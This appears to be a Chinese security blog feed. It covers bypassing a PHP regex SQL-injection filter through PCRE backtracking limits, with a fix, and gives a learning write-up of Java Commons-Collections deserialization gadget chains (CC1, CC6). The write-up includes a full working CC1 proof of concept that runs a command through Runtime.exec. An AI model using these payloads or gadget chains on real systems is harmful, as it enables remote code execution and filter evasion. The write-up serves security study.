<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 可以使用<code>UNION/*aaaaa......*/SELECT</code>增加回溯次数来绕过限制。</p>
<p><strong>修复方法</strong></p>
<p>我们可以通过全等号来判断<code>preg_match</code>的返回值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>) === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://blog.csdn.net/liuxiao723846/article/details/83308081" >正则引擎：DFA与NFA<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/zpflwy1314/article/details/82665254" >DFA与NFA的比较<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" >PHP利用PCRE回溯次数限制绕过某些安全限制<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>java反序列化之CC链1-7学习</title>
    <url>/2022/03/25/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE1-7%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>假设某服务器接收java字节码并使用<code>ObjectInputStream.readObject</code>方法进行反序列化，我们将包含执行命令代码的Test类序列化后直接传给服务器，这时服务器上并不会触发命令，而是报错，因为会找不到Test类，所以想要触发命令我们就需要找服务器上存在的类，如何通过存在的类在反序列化的时触发命令?</p>
<p><strong>如果反序列化的类定义了<code>readObject</code>方法，在服务器上执行<code>ObjectInputStream.readObject</code>时，会自动调用反序列化类中的<code>readObject</code>方法，更进一步的，如果反序列化类的<code>readObject</code>方法中执行了该类成员变量的某些方法，而这些成员变量是可控的，一个反序列化利用或许就出现了</strong>。在<code>readObject</code>反序列化中有个重要利用链就是Commons-Collections组件的利用链，该组件是各种中间件必用的组件，利用的非常广泛。</p>
<p>先看下CommonsCollections链中几个关键的类，这几个类就可以实现任意任意类和方法的调用，都实现了<code>Transformer</code>接口，该接口就一个<code>transform</code>方法，我们重点关注这几个实现类的<code>transform</code>方法的逻辑。</p>
<h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>构造方法作用就是将传入的对象保存为一个常量，调用实例的transform方法就返回该常量。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>主要作用是通过反射调用传入对象的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p>实例化这个类需要传入<code>Transformer</code>的数组，调用这个类的<code>transform</code>方法就会遍历数组中每个元素的<code>transform</code>方法，每次<code>transform</code>方法返回的对象会作为下一个<code>transform</code>方法的输入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h3><p>现在我们将上面三个类串起来，写一个执行命令的简单例子，创建一个<code>Transformer</code>数组，将Runtime对象传入<code>ConstantTransformer</code>作为第一个元素，通过<code>InvokerTransformer</code>调用<code>Runtime</code>实例的<code>exec</code>方法放在第二个元素，然后将<code>Transformer</code>数组传入<code>ChainedTransformer</code>构造方法，最后调用其<code>transform</code>方法就可以触发命令。</p>
<img src="/2022/03/25/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE1-7%E5%AD%A6%E4%B9%A0/image-20220305230623599.png" class="" title="image-20220305230623599">

<p>其实<code>chainedTransformer</code>调用过程和<code>object.xxx().yyy().zzz()</code>是一样的，进一步将上面<code>Runtime.getRuntime()</code>改为反射的写法</p>
<p>为什么Runtime.getRuntime()需要进一步修改为反射的写法？</p>
<blockquote>
<p>Java中不是所有对象都支持序列化，待序列化的对象和所有它使用的内部属性对象，必须都实现了 java.io.Serializable 接口。而我们最早传给ConstantTransformer的是Runtime.getRuntime() ，Runtime类是没有实现 java.io.Serializable 接口的，所以不允许被序列化。</p>
<p> 所以需要将Runtime.getRuntime() 换成 Runtime.class ，前者是一个java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。Class类有实现Serializable接口，所以可以被序列化。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">chainedTransformer.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>其实等价于<code>Runtime.class.getMethod(&quot;getRuntime&quot;).invoke(null,null).exec(&quot;calc&quot;)</code>，现在我们可以通过<code>chainedTransformer</code>的<code>transform</code>方法到命令执行了，那么如何从<code>readObject</code>到<code>transform</code>函数呢？这就是<code>CommonsCollections</code>链的意义了</p>
<h2 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h2><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>上面我们是手写触发<code>chainedTransformer</code>的<code>transform</code>方法，一般不会有代码直接写<code>chainedTransformer.transform(null)</code>，所以我们需要找到更加常用且有调用<code>transform</code>的方法，LazyMap正好符合要求，看下LazyMap的关键源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>LazyMap的<code>decorate</code>方法会将传入的<code>Transformer</code>保存为<code>factory</code>，当从<code>map</code>中不包含get的key时，会触发<code>factory</code>的<code>transform</code>方法。</p>
<p>所以我们将一个空的map和执行命令的<code>chainedTransforme</code>传入LazyMap的<code>decorate</code>，再调用该LazyMap的<code>get</code>方法（key为任意）即可触发<code>transform</code></p>
<img src="/2022/03/25/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE1-7%E5%AD%A6%E4%B9%A0/image-20220306190610425.png" class="" title="image-20220306190610425">

<p>接着进一步寻找实现了<code>readObject</code>，并且通过<code>readObject</code>能触发到LazyMap的<code>get</code>方法，这样就可以构成一个反序列化利用链了。AnnotationInvocationHandler类正好可以满足这样的要求。</p>
<h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p>先看下AnnotationInvocationHandler类（JDK8的版本要&lt;1.8.0_71）关键的几个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">            <span class="built_in">this</span>.type = var1;</span><br><span class="line">            <span class="built_in">this</span>.memberValues = var2;  <span class="comment">// 保存传进来的Map实例</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();  <span class="comment">// 如果设置了动态代理，这里会先调用memberValues的invoke方法</span></span><br><span class="line">		......</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        ......</span><br><span class="line">            <span class="keyword">switch</span>(var7) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.toStringImpl();</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);  <span class="comment">// 这里触发get方法</span></span><br><span class="line">                ......</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中的<code>invoke</code>方法会调用到<code>memberValues</code>的<code>get</code>方法，而<code>memberValues</code>可通过构造函数赋值为LazyMap，所以能调用到<code>Invoke</code>就可以触发，要怎么通过<code>readObject</code>方法调用到<code>invoke</code>方法呢？可以通过java对象代理。</p>
<p>java提供了<code>newProxyInstance</code>创建对象代理的方式：<code>newProxyInstance(ClassLoader loader,  Class&lt;?&gt;[] interfaces, InvocationHandler h)</code>，第1个参数是<code>ClassLoader</code>，默认即可；第2个参数是我们需要代理的对象集合；第3个参数为实现了<code>InvocationHandler</code>接口的实例，里面包含了具体代理的逻<br>辑，<code>AnnotationInvocationHandler</code>类正好实现了<code>InvocationHandler</code>和<code>Serializable</code>接口，可以作为第3个参数。</p>
<p>被对象代理设置的对象，调用其任意方法时，都会先调用代理类，也就是<code>InvocationHandler</code>实例的<code>invoke</code>方法。</p>
<p>上方代码<code>readObject</code>方法的第23行，在传入的<code>this.memberValues</code>有设置对象代理时，调用其任意方法都会触发其代理类的<code>invoke</code>方法，代理类可以设置<code>AnnotationInvocationHandler</code>，在<code>invoke</code>中就可以触发<code>get</code>方法了，这样我们打通了整个利用链。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** ysoserial的Gadget chain</span></span><br><span class="line"><span class="comment">      ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">         AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">            Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">               AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">                  LazyMap.get()</span></span><br><span class="line"><span class="comment">                     ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                        ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                           Method.invoke()</span></span><br><span class="line"><span class="comment">                              Class.getMethod()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                           Method.invoke()</span></span><br><span class="line"><span class="comment">                              Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                           Method.invoke()</span></span><br><span class="line"><span class="comment">                              Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>cc1完整poc如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 将一条空的fakeTransformers传给ChainedTransformer，避免本地调试时触发命令</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取构造函数</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建代理类</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap);</span><br><span class="line">        <span class="comment">// 动态代理，创建lazyMap实例</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), invocationHandler);</span><br><span class="line">        <span class="comment">// 创建被反序列化的AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">aa</span> <span class="operator">=</span> constructor.newInstance(Override.class, map1);</span><br><span class="line">        <span class="comment">// 序列化前再将真正触发命令的transformers设置进去</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField((<span class="string">&quot;iTransformers&quot;</span>));</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(aa);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/03/25/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE1-7%E5%AD%A6%E4%B9%A0/image-20220320225339874.png" class="" title="image-20220320225339874">

<h2 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h2><p>上面CC1只有在jdk版本低于1.8.0_71才能触发，因为新版本<code>AnnotationInvocationHandler#readObject</code>逻辑变了。我们要解决jdk高版本利用的问题，其实就是要寻找其他调用<code>LazyMap#get()</code>的地方，<code>TideMapEntry#hashCode</code>方法正好有调用。</p>
<h3 id="TideMapEntry"><a href="#TideMapEntry" class="headerlink" title="TideMapEntry"></a>TideMapEntry</h3><p>先看下TideMapEntry的几个关键方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以通过构造方法将LazyMap传入<code>this.map</code>，然后通过<code>getValue</code>方法可以触发其<code>get</code>方法，而<code>hashCode</code>又有调用到<code>getValue</code>，所以我们需要继续找一个类，该类的<code>readObject</code>可以通到<code>TideMapEntry#hashCode</code>。</p>
<h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ......</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);  <span class="comment">// 调用hash方法</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>HashMap的<code>readObject</code>会调用<code>hash</code>方法，hash方法内触发<code>key</code>的<code>hashCode</code>，如果我们<code>key</code>传入<code>TideMapEntry</code>，就可以触发<code>TideMapEntry#hashCode</code>了，其实到这里从<code>readObject</code>到<code>transform</code>就走通了，算是一个简化版的CC6链，Ysoserial中CC6在此基础上加了层<code>HashSet#readObject</code>。</p>
<h3 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h3><p><code>HashSet#readObject</code>会调用HashMap的<code>put</code>方法，正好可以跟上面链接起来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    ......</span><br><span class="line">    	<span class="comment">// Create backing HashMap</span></span><br><span class="line">        map = (((HashSet&lt;?&gt;)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HashMap#put</span></span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><p>CC6利用链和poc如下</p>
